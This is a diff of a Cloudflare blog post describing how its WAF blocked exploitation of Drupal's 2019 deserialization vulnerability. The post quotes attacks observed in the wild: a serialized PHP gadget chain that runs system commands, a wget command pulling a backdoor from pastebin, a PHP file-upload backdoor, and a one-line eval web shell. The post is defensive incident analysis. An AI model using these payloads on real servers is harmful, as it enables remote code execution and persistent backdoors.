@@ -1,52 +1,50 @@
-<div class="mb2 gray5">4 min read</div>
+<div class="mb2 gray5">3 min read</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/6nNINh3XsTGMn2l5jdzrb7/a40cfd690867721f8f84210199a6114a/stopping-drupal-sa-core-2019-003.png" alt="">
 <div class="post-content lh-copy gray1">
 	<p>On the 20th February 2019, Drupal <a href="https://www.drupal.org/psa-2019-02-19">announced</a> that they had discovered a severe vulnerability and that they would be releasing a patch for it the next day. Drupal is a Content Management System used by many of our customers, which made it important that our WAF protect against the vulnerability as quickly as possible.</p>
 	<p>As soon as Drupal released their patch, we analysed it to establish what kind of payloads could be used against it and created rules to mitigate these. By analysing the patch we were able to put together WAF rules to protect cloudflare customers running Drupal.</p>
 	<p>We identified the type of vulnerability we were dealing within 15 minutes. From here, we were able to deploy rules to block the exploit well before any real attacks were seen.</p>
-	<h3 id="the-exploit">The exploit</h3>
+	<h3>The exploit</h3>
 	<p>As Drupal's <a href="https://www.drupal.org/sa-core-2019-003">release announcement</a> explains, a site is affected if:</p>
 	<ul>
-		<li>It has the Drupal 8 RESTful API enabled &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>
-		<li>Or it uses <a href="https://www.drupal.org/sa-contrib-2019-020">one</a> of the <a href="https://www.drupal.org/security/contrib">8 modules</a> found to be affected</li>
+		<li>
+			<p>It has the Drupal 8 RESTful API enabled &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
+		</li>
+		<li>
+			<p>Or it uses <a href="https://www.drupal.org/sa-contrib-2019-020">one</a> of the <a href="https://www.drupal.org/security/contrib">8 modules</a> found to be affected</p>
+		</li>
 	</ul>
 	<p>From looking at the <a href="https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936">patch</a> we very quickly realised the exploit would be based on deserialization. The option <code>['allowed_classes' =&gt; FALSE]</code> was added as part of the patch to the <a href="https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-9077dc961778b7c8d9c47882c4248e42L67">link</a> and <a href="https://github.com/drupal/drupal/commit/9b3e441c2c6d98da402fcc8cab1e921ab8286936#diff-d200adc66611cf78e65f2a3258144c49L194">map</a> field types. This indicates that while these items are supposed to receive some serialized PHP, there was no legitimate case for supplying a serialized PHP object.</p>
 	<p>This is important because the easiest way to exploit a deserialization vulnerability in PHP is to supply a serialized Object that is crafted to execute code when deserialized.</p>
 	<p>Making the situation worse was the fact that the deserialization was performed regardless of any authentication.</p>
 	<p>We also realised that this meant blindly blocking all serialized PHP would break their intended functionality, as clearly these fields are supposed to receive specific kinds of serialized PHP, for example arrays or strings. Although as the PHP documentation <a href="https://secure.php.net/manual/en/function.unserialize.php">notes</a>, it’s always a risky thing to deserialize untrusted data, even when restricting the set of data that’s excepted.</p>
 	<p>This blog <a href="https://www.ambionics.io/blog/drupal8-rce">post from Ambionics</a> does a good job at explaining what a concrete exploitation of the vulnerability looks like, when applied to the Drupal 8 RESTful API.</p>
-	<h3 id="what-we-caught">What we caught</h3>
+	<h3>What we caught</h3>
 	<p>After the vulnerability was announced, we created several rules to experiment with different ways to build a signature to catch exploit attempts. Within an hour of the Drupal announcement we had deployed these in simulate mode, which logs potentially malicious requests without blocking them. After monitoring for false positives they were then improved them a few times as we tuned them.</p>
 	<p>This culminated in the deploy of rule D0020, which has blocked a number of attackers as shown in the graph below. The rule was already deployed in ‘drop’ mode by the time our first attack was observed at around 7pm UTC on Friday the 22nd of February 2019, and to date it has matched zero false positives. This is less than 48 hours from the announcement from Drupal.</p>
-	<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.cloudflare.com/content/images/2019/03/D0020.png" class="kg-image" alt="" loading="lazy">
-		<figcaption>Figure 1: Hits on rule D0020, with the first attack seen on the 22th February 2019.</figcaption>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1UGyxkHL7SuJOy3M65Kf1u/e2f335754bcf641c64a6cd4f11a6180e/D0020.png" alt="" class="kg-image" width="1712" height="645" loading="lazy">
+
 	</figure>
-	<p></p>
+	<p>Figure 1: Hits on rule D0020, with the first attack seen on the 22th February 2019.</p>
 	<p>These first attacks leveraged the “guzzle/rce1” gadget from phpggc to invoke the linux command “id” via PHP’s “system” function, exactly as <a href="https://www.ambionics.io/blog/drupal8-rce">ambionics</a> did.</p>
-	<p></p><!--kg-card-begin: markdown-->
-	<pre><code>'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}''
-</code></pre>
-	<!--kg-card-end: markdown-->
-	<p></p>
+	<pre class="language-bash"><code class="language-bash">'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}''</code></pre>
 	<p>After this we saw several more attempts to use this gadget for executing various payloads, mostly to test whether targeted servers were vulnerable. Things like ‘phpinfo’, echoing strings and performing calculations.</p>
 	<p>The first malicious payload we saw used the same gadget, but this time to save a malicious payload from pastebin onto the user’s server.</p>
 	<p><code>wget -O 1x.php https://pastebin.com/raw/npLq4493</code></p>
 	<p>This script would have placed a backdoor on the target system by allowing them to upload files to the server via an HTML form. This would have given the attacker continued access to the system even if it was subsequently patched.</p>
-	<p></p><!--kg-card-begin: markdown-->
-	<pre><code>&lt;?  echo "'XXXXXXXXXXXX";
+	<pre class="language-bash"><code class="language-bash">&lt;?  echo "'XXXXXXXXXXXX";
 $cwd = getcwd();
 Echo '&lt;center&gt;  &lt;form method="post" target="_self" enctype="multipart/form-data"&gt;  &lt;input type="file" size="20" name="uploads" /&gt; &lt;input type="submit" value="upload" /&gt;  &lt;/form&gt;  &lt;/center&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;';
 if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);
     Echo "&lt;script&gt;alert('upload Done');
 		&lt;/script&gt;&lt;b&gt;Uploaded !!!&lt;/b&gt;&lt;br&gt;name : ".$_FILES['uploads']['name']."&lt;br&gt;size : ".$_FILES['uploads']['size']."&lt;br&gt;type : ".$_FILES['uploads']['type'];
 }
-?&gt;
-</code></pre>
-	<!--kg-card-end: markdown-->
-	<p></p>
+?&gt;</code></pre>
 	<p>Another malicious payload seen was much more minimal:</p>
 	<p><code>echo '&lt;?php @eval($_POST['pass']) ?&gt;' &gt; vuln1.php</code></p>
 	<p>This payload creates a small PHP file on the server, which contains the dangerous eval() function. If this hadn’t been blocked, it would have allowed the attacker to issue commands via a single HTTP request to the vuln1.php file that could execute arbitrary commands directly on the potentially vulnerable system.</p>
-	<h3 id="rates-of-exploitation">Rates of exploitation</h3>
+	<h3>Rates of exploitation</h3>
 	<p>The pattern we saw here is fairly typical of a newly announced vulnerability. Once a vulnerability is published, it doesn’t take long to see real attackers making use of the vulnerability - initially in small numbers with “test” payloads to identify whether the attacks work, but shortly afterwards in much higher numbers, and with more dangerous and subtle payloads. This vulnerability was weaponized within two days of disclosure, but that is by no means the shortest time frame we’ve seen.</p>
 	<p>It’s very hard to patch systems quickly enough to ensure that attackers don’t get through, so products like Cloudflare’s WAF are a vital line of defense against these emerging vulnerabilities.</p>
 </div>
